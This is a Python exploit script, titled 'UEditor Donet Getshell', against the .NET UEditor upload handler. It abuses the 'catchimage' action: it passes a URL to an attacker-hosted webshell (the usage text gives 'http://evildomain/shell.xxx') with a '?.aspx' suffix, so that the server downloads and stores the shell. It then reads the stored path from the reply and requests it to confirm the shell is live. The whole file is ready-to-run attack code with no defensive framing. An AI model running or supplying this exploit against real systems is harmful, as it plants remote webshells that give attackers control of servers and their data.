import requests
import json
import sys
import os
from urllib.request import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0"
}

def Exploit(Target,Evilurl,Type):
    try:
        if Type not in ['aspx','ashx','asmx']:
            print("[!]Invalid type!")
            exit()
        payload = Evilurl + "?." + Type
        response = requests.post(
            url = Target + "?action=catchimage",
            data={'source[]': payload},
            headers = headers,
            verify=False
        )
        if "state" not in str(response.content,encoding='utf-8'):
            print("[!]Exploit failed!")
            exit()
        jsonRes = json.loads(str(response.content,encoding='utf-8'))
        shell = "{}://{}{}".format(urlparse(Target).scheme,urlparse(Target).netloc,jsonRes['list'][0]['url'])
        print("\r\n[*]Exploit successfuly!\r\n[*]Shell: "+ shell)
        print("[*]Verifying.....")
        verify = requests.get(
            url=shell,
            headers=headers,
            verify=False
        )
        if verify.status_code in [404,403]:
            print("[!]Verify failed, please manual verify!")
            exit()
        print("[*]Verify successfuly!")
    except Exception as e:
        print(e)
    

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("========== UEditor Donet Getshell ==========\r\n")
        print("usage: "+str(sys.argv[0][sys.argv[0].rfind(os.sep) + 1:])+"  http://target/UEditor-handle-path.ashx  http://evildomain/shell.xxx aspx\r\n")
        print("arg 1: Target UploadHandler or Controller ashx file url.\r\n")
        print("arg 2: aspx,ashx or asmx Webshell url.\r\n")
        print("arg 3: Webshell type. [aspx,ashx,asmx]\r\n")
        print("========== Auther: S0cke3t ==========")
        exit()
    Exploit(sys.argv[1],sys.argv[2],sys.argv[3])